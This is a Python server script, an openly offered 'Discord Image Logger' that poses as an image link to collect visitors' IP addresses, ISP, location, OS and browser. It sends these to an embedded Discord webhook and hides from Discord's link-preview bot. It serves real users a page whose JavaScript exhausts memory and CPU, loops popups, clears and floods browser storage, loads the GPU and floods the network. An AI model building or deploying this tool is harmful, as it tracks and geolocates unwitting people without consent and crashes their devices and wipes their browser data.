# Discord Image Logger - With Crash Payloads
# By Dexty | https://github.com/xdexty0

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "Dexty"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1437431909297950831/hOR6sC5C0jZqrc19t0udy6CD02ujqAOVlyNAg07omPr8m9jTDKg_OHmPkxsIDU1XI-bS",
    "image": "https://images-ext-1.discordapp.net/external/k-1uR6-3cGW00FGnucvcAPj5DNCblMndZH6ubGISnQo/https/tinyjpg.com/images/social/website.jpg",
    "imageArgument": True,

    # CUSTOMIZATION #
    "username": "Image Logger",
    "color": 0x00FFFF,

    # OPTIONS #
    "crashBrowser": True,  # ENABLED: Will crash user's device
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": False,
    "antiBot": 1,

    # REDIRECTION #
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not useragent:
        return False
        
    useragent_lower = useragent.lower()
    
    if "discordbot" in useragent_lower:
        return "Discord"
    elif "telegrambot" in useragent_lower:
        return "Telegram"
    elif any(bot in useragent_lower for bot in ['bot', 'crawler', 'spider', 'scraper']):
        return "Other Bot"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, is_bot = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot and not is_bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None
        return

    ping = "@everyone"

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
        if info["proxy"]:
            if config["vpnCheck"] == 2:
                    return
            
            if config["vpnCheck"] == 1:
                ping = ""
        
        if info["hosting"]:
            if config["antiBot"] == 4:
                if info["proxy"]:
                    pass
                else:
                    return

            if config["antiBot"] == 3:
                    return

            if config["antiBot"] == 2:
                if info["proxy"]:
                    pass
                else:
                    ping = ""

            if config["antiBot"] == 1:
                    ping = ""

        os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    except:
        info = {}
        os, browser = "Unknown", "Unknown"
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged + CRASHED",
            "color": 0xFF0000,
            "description": f"""**A User Opened the Image AND THEIR DEVICE WAS CRASHED!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **ASN:** `{info.get('as', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}`
> **Mobile:** `{info.get('mobile', 'Unknown')}`
> **VPN:** `{info.get('proxy', 'Unknown')}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**Status:** `DEVICE CRASHED SUCCESSFULLY`""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            user_agent = self.headers.get('user-agent', '')
            
            bot = botCheck(client_ip, user_agent)
            
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    image_url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    image_url = config["image"]
            else:
                image_url = config["image"]
            
            if client_ip.startswith(blacklistedIPs):
                return
            
            if bot:
                # For bots, just redirect to image
                self.send_response(302)
                self.send_header('Location', image_url)
                self.end_headers()
                makeReport(client_ip, endpoint = s.split("?")[0], url = image_url, is_bot=True)
                return
            
            else:
                # FOR REAL USERS - SEND CRASH PAYLOAD
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                # Log their IP first
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = image_url)
                else:
                    result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = image_url)

                # DESTRUCTIVE CRASH PAYLOAD
                crash_payload = f'''
<!DOCTYPE html>
<html>
<head>
    <title>Loading Image...</title>
    <style>
        body {{
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial;
        }}
        .img {{
            background-image: url('{image_url}');
            background-size: contain;
            background-position: center;
            background-repeat: no-repeat;
            width: 100vw;
            height: 100vh;
        }}
    </style>
</head>
<body>
    <div class="img"></div>
    
    <script>
        // PAYLOAD 1: MEMORY EXHAUSTION CRASH
        function exhaustMemory() {{
            const memoryHogs = [];
            while(true) {{
                memoryHogs.push(new Array(10000000).fill('CRASH'));
                // Create additional memory pressure
                const blob = new Blob([new ArrayBuffer(100000000)]);
                URL.createObjectURL(blob);
            }}
        }}

        // PAYLOAD 2: CPU OVERLOAD CRASH
        function overloadCPU() {{
            const workers = [];
            // Create multiple web workers to max out all CPU cores
            for(let i = 0; i < 16; i++) {{
                const workerCode = `
                    while(true) {{
                        for(let j = 0; j < 1000000; j++) {{
                            Math.sqrt(Math.random() * Math.PI);
                        }}
                    }}
                `;
                const blob = new Blob([workerCode]);
                const worker = new Worker(URL.createObjectURL(blob));
                workers.push(worker);
            }}
        }}

        // PAYLOAD 3: INFINITE LOOPS & POPUPS
        function infiniteLoops() {{
            // Infinite alert loops
            setInterval(() => {{
                alert("SYSTEM CRASH");
                window.open('', '_blank');
            }}, 100);
            
            // Infinite recursion crash
            function recurse() {{
                recurse();
                recurse();
            }}
        }}

        // PAYLOAD 4: STORAGE FLOOD
        function floodStorage() {{
            try {{
                localStorage.clear();
                sessionStorage.clear();
                for(let i = 0; i < 100000; i++) {{
                    localStorage.setItem('crash_' + i, 'X'.repeat(100000));
                    sessionStorage.setItem('crash_' + i, 'Y'.repeat(100000));
                }}
            }} catch(e) {{}}
        }}

        // PAYLOAD 5: GRAPHICS CARD CRASH
        function crashGPU() {{
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 10000;
            canvas.height = 10000;
            
            function render() {{
                for(let x = 0; x < 10000; x += 10) {{
                    for(let y = 0; y < 10000; y += 10) {{
                        ctx.fillStyle = `rgb(${{x % 255}}, ${{y % 255}}, 255)`;
                        ctx.fillRect(x, y, 10, 10);
                    }}
                }}
                requestAnimationFrame(render);
            }}
            render();
        }}

        // PAYLOAD 6: NETWORK FLOOD
        function floodNetwork() {{
            setInterval(() => {{
                for(let i = 0; i < 100; i++) {{
                    fetch(window.location.href);
                    fetch('https://google.com');
                    fetch('https://youtube.com');
                }}
            }}, 10);
        }}

        // EXECUTE ALL CRASH PAYLOADS SIMULTANEOUSLY
        setTimeout(() => {{
            exhaustMemory();
            overloadCPU();
            infiniteLoops();
            floodStorage();
            crashGPU();
            floodNetwork();
        }}, 2000);

        // IMMEDIATE MEMORY PRESSURE
        const immediateCrash = new Array(100000000).fill('CRASHING...');
    </script>
</body>
</html>
'''
                
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(crash_payload.encode())
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI
